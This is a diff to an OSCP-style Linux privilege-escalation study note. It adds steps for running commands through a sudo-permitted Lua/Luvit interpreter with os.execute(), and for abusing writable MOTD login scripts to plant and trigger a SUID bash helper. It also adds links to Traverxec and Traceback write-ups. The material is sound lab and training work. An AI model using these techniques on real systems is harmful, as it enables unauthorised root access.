@@ -104,6 +104,55 @@ strings core.$Pid | grep -Ei 'password|pass|cred|secret'
 - [ ] `gcore` reveals a candidate credential → **Store it privately and validate it through the relevant credential stage**
 - [ ] Neither path applies → **Continue to Step 15 · [[Linux - SUID Check]]**
 
+## Interpreter or embedded-code runner
+
+When `sudo -l` permits a scripting interpreter as another user, inspect its help output for inline evaluation. A permitted interpreter is often an indirect command-execution primitive even when Bash is not explicitly allowed.
+
+> **Why:** `-e` evaluates Lua code, and `os.execute()` passes the command to the operating system with the run-as identity granted by sudo.
+```bash
+sudo -u $Username2 $AllowedInterpreter --help
+sudo -u $Username2 $AllowedInterpreter -e 'os.execute("id")'
+```
+
+For Luvit/Lua:
+
+```bash
+sudo -u $Username2 /home/sysadmin/luvit -e 'os.execute("id")'
+sudo -u $Username2 /home/sysadmin/luvit -e 'os.execute("whoami")'
+```
+
+> [!warning] 💡
+> Do not substitute `/bin/bash` for the permitted interpreter. Sudo checks the executable and arguments. Use the allowed interpreter's own command-execution feature, prove the new identity with `id`, and then repeat local enumeration as that user.
+
+## Login-triggered scripts and MOTD permissions
+
+After an interpreter pivot, inspect scripts that execute during login or connection setup. Ubuntu's `/etc/update-motd.d/` scripts run when SSH builds the login message. A root-owned script that is writable by the current user or group is a privileged execution path.
+
+> **Why:** These checks connect ownership, group write permission, and the event that triggers execution before a payload is written.
+```bash
+ls -la /etc/update-motd.d/
+stat -c '%U:%G %A %n' /etc/update-motd.d/* 2>/dev/null
+grep -RniE 'update-motd|motd|ssh' /etc/ssh /etc/update-motd.d 2>/dev/null
+```
+
+If the file is writable through the current run-as identity, preserve it first and use a controlled marker or SUID helper only in an authorised lab:
+
+```bash
+sudo -u "$Username2" "$AllowedInterpreter" -e \
+  "os.execute(\"cp /etc/update-motd.d/00-header /home/$Username2/00-header.bak\")"
+```
+
+Trigger the event with a fresh authenticated SSH connection, then verify the side effect. For a SUID Bash helper:
+
+```bash
+ssh $Username@$BoxIP 'true'
+ls -la /tmp/rootbash
+/tmp/rootbash -p -c 'id && whoami'
+```
+
+> [!warning] 💡
+> Editing a login script does not execute it immediately. Trigger the documented event, verify the output artifact, and restore the original script before closing the box.
+
 ## Sudo-allowed configuration generators
 
 When `sudo -l` exposes a script rather than a standard GTFOBins binary, read the script and every helper it invokes. Pay special attention when it writes a configuration file and immediately calls a privileged service that sources that file. Validate the input character class, quoting, separators, and whether spaces are accepted.
@@ -157,6 +206,8 @@ sudo /bin/nano $SudoFile
 - [[OSCP/BOXES/WRITE UPS/Linux/SwagShop|SwagShop]] -- passwordless Vim sudo rule yielded a root shell escape
 - [[OSCP/BOXES/WRITE UPS/Linux/Networked|Networked]] -- passwordless sudo `changename.sh` led to an `ifup` configuration injection
 - [[OSCP/BOXES/WRITE UPS/Linux/TartarSauce|TartarSauce]] -- passwordless sudo `/bin/tar` used the checkpoint action to become `onuma`
+- [[OSCP/BOXES/WRITE UPS/Linux/Traverxec|Traverxec]] -- argument-specific `journalctl` permission opened a pager and a root shell
+- [[OSCP/BOXES/WRITE UPS/Linux/Traceback|Traceback]] -- passwordless sudo to Luvit enabled Lua `os.execute()` as another user
 
 ## Related stages
 
